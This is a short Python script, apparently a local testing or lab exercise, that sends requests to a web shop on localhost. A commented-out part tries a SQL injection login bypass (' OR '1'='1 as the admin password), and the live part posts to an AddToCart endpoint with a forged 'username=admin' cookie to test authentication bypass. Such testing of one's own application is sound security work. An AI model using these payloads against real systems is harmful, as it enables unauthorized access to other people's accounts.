import requests

# url = "http://localhost:5057/Home/Login"

# data = {
#     "Username": "admin",
#     "Password": "' OR '1'='1"
# }

# r = requests.post(url, data=data)

url = "http://localhost:5057/Home/AddToCart"

data = {
    "id" : "1"
}

cookie = {
    "username" : "admin"
}

r = requests.post(url, data=data,cookies=cookie)

print(r.status_code)

print(r.headers)

# with open('res.html', 'w') as f:
#     f.write(r.text)
# print(r.headers)
# print(r.text)